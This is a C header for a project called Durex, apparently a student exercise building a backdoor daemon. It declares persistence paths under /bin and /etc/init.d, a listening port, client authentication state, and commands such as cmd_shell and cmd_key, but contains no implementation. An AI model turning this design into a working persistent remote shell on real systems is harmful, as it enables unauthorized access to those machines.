#ifndef DUREX_H
#define DUREX_H

#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <stdbool.h>
#include <stdlib.h>
#include <stdio.h>

#define RED "\033[31m"
#define GREEN "\033[32m"
#define BOLD "\033[1m"
#define NC "\033[0m"

#define USERNAME "usavoia"
#define MAX_CLIENTS 3
#define MAX_BUFF 4096
#define PORT 4242
#define PATH_DAEMON "/bin/Durex"
#define DAEMON "./src/daemon/durex_daemon"
#define INIT "./src/Durex.init"
#define PATH_INIT "/etc/init.d/Durex"

typedef	struct	s_client
{
	bool	auth;
	int 	fd;
	char 	log[MAX_BUFF];
	char 	read_buffer[MAX_BUFF];
	char 	write_buffer[MAX_BUFF];
}				t_client;

typedef	struct	s_deamon
{
	int 			sockfd;
	t_client		clients[MAX_CLIENTS];
	char 			connected_clients;
	fd_set			fd_write;
	fd_set			fd_read;
	unsigned long	io_data;
}				t_deamon;

void 	server_loop(t_deamon *durex, char **env);

void 	remove_client(t_deamon *durex, int index);

void 	msg_to_client(t_deamon *durex);
void 	cmd_help(t_deamon *durex, int index);
void 	cmd_shell(t_deamon *durex, int index, char **env);
void 	cmd_io(t_deamon *durex, int index);
void 	cmd_log(t_deamon *durex, int index);
void 	cmd_key(t_deamon *durex, int index);

#endif
